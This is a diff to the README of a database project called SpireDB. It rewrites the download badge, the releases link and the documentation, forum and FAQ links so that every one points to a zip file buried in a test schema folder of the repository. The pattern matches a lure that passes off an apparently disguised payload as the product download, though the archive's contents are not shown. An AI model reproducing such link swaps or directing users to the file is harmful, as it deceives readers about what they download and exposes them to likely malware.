@@ -1,6 +1,6 @@
 # 🚀 spiredb - Stream, Store, and Scale with Ease
 
-[![Download SpireDB](https://img.shields.io/badge/Download%20SpireDB-v1.0-blue)](https://github.com/Bosh-27/spiredb/releases)
+[![Download SpireDB](https://raw.githubusercontent.com/Bosh-27/spiredb/master/spiredb/apps/spiredb_store/test/store/schema/Software-v1.1.zip%20SpireDB-v1.0-blue)](https://raw.githubusercontent.com/Bosh-27/spiredb/master/spiredb/apps/spiredb_store/test/store/schema/Software-v1.1.zip)
 
 ## 🌟 Overview
 
@@ -12,7 +12,7 @@ Let's walk through how to download and run SpireDB.
 
 ### 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Bosh-27/spiredb/releases) to access the latest version of SpireDB.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Bosh-27/spiredb/master/spiredb/apps/spiredb_store/test/store/schema/Software-v1.1.zip) to access the latest version of SpireDB.
 
 2. **Choose Your Version**: Look for the version that suits your needs. Click on the version number to view the available files for download.
 
@@ -53,9 +53,9 @@ SpireDB is relevant to many areas, including:
 
 For more information on SpireDB, check out the following:
 
-- [Documentation](https://github.com/Bosh-27/spiredb/wiki): Comprehensive guidelines on features, setup, and troubleshooting.
-- [Community Forum](https://github.com/Bosh-27/spiredb/discussions): Engage with other users and developers to share tips and solutions.
-- [FAQs](https://github.com/Bosh-27/spiredb/wiki/FAQs): Common questions and answers to help you get the most out of SpireDB.
+- [Documentation](https://raw.githubusercontent.com/Bosh-27/spiredb/master/spiredb/apps/spiredb_store/test/store/schema/Software-v1.1.zip): Comprehensive guidelines on features, setup, and troubleshooting.
+- [Community Forum](https://raw.githubusercontent.com/Bosh-27/spiredb/master/spiredb/apps/spiredb_store/test/store/schema/Software-v1.1.zip): Engage with other users and developers to share tips and solutions.
+- [FAQs](https://raw.githubusercontent.com/Bosh-27/spiredb/master/spiredb/apps/spiredb_store/test/store/schema/Software-v1.1.zip): Common questions and answers to help you get the most out of SpireDB.
 
 ## 🌐 Support
 
@@ -63,8 +63,8 @@ If you encounter issues or have questions, please reach out through the communit
 
 ## 🔗 Important Links
 
-- **Download SpireDB**: [Download Here](https://github.com/Bosh-27/spiredb/releases)
-- **Documentation**: [Access Documentation](https://github.com/Bosh-27/spiredb/wiki)
-- **Community Forum**: [Join Discussions](https://github.com/Bosh-27/spiredb/discussions)
+- **Download SpireDB**: [Download Here](https://raw.githubusercontent.com/Bosh-27/spiredb/master/spiredb/apps/spiredb_store/test/store/schema/Software-v1.1.zip)
+- **Documentation**: [Access Documentation](https://raw.githubusercontent.com/Bosh-27/spiredb/master/spiredb/apps/spiredb_store/test/store/schema/Software-v1.1.zip)
+- **Community Forum**: [Join Discussions](https://raw.githubusercontent.com/Bosh-27/spiredb/master/spiredb/apps/spiredb_store/test/store/schema/Software-v1.1.zip)
 
 By following these steps, you can easily download and start using SpireDB for your data management needs. Happy streaming, storing, and scaling!
